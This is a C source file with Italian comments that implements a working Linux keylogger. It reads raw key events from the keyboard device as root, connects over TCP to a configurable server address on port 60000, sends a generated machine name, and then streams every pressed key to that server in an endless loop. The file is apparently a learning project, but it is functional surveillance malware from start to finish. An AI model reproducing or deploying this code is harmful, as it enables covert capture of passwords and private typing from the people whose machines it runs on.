#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <linux/input.h>
#include <errno.h>
#include <time.h>
#include "keyboard.h"
#include "berkeleySockets.h"

#define PORT 60000

void generateName(char name[]);

void activate_keylogger(){

    //Apertura buffer Keyboard
    const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    int kfd = open(dev, O_RDONLY);
    if(kfd < 0){ perror("file must be open as root"); exit(1); }


    //Avvio della connessione col Server (a cui il keylogger invierà i dati)

    // Definizione dell'Indirizzo
    unsigned short port = PORT;
    char* IPaddress = "127.0.0.1"; // works also for local end global addresses, for example "10.0.2.15";
    struct sockaddr_in serverAddr = getInitAddr(AF_INET, port, IPaddress);

    // Creazione della connessione e connessione al server
    int sockfd = Socket(PF_INET, SOCK_STREAM, 0);
    Connect(sockfd, serverAddr, sizeof(serverAddr));

    //invio al server delle proprie info
    FILE* fp;
    char name[128];
    fp = fopen("myinfo.txt","r");
    if(fp == NULL){                     //first time executing this script
        fp = fopen("myinfo.txt","w");   //create file
        generateName(name);             //generate name
        fputs(name, fp);                //save on file
    }
    else{
        fgets(name,128,fp);
    }
    fclose(fp);
    

    //send machine info to server
    if(fullWrite(sockfd, (void*)name, 128) != 0){
        fprintf(stderr, "fullWrite error\n");
        exit(-1);
    }

    //Lettura e invio al server
    int n;
    struct input_event ev;
    while(1){
        
        //leggiamo dal buffer della tastiera
        if(fullRead(kfd, (void*)&ev, sizeof(ev)) != 0){
            fprintf(stderr, "fullRead error\n");
            exit(-1);
        }

        //se un tasto è stato premuto/rilasciato, lo convertiamo e inviamo al server
        unsigned char ch;
        if (ev.type == EV_KEY && (ev.value == PRESSED || ev.value == RELEASED)){
            ch = getCodeMeaning(ev.code, ev.value);
            if(ev.value == RELEASED)                //we want to send ch only when key is pressed
                continue;
            if(fullWrite(sockfd, (void*)&ch, sizeof(ch)) != 0){
                fprintf(stderr, "fullWrite error\n");
                exit(-1);
            }
        }

    }

    close(kfd);
    close(sockfd);
}

void generateName(char name[]){
    srand(time(NULL));
    time_t rnum = rand()%100000;
    char genName[128];
    sprintf(genName, "%d", (int)rnum);
    strcpy(name,genName);
}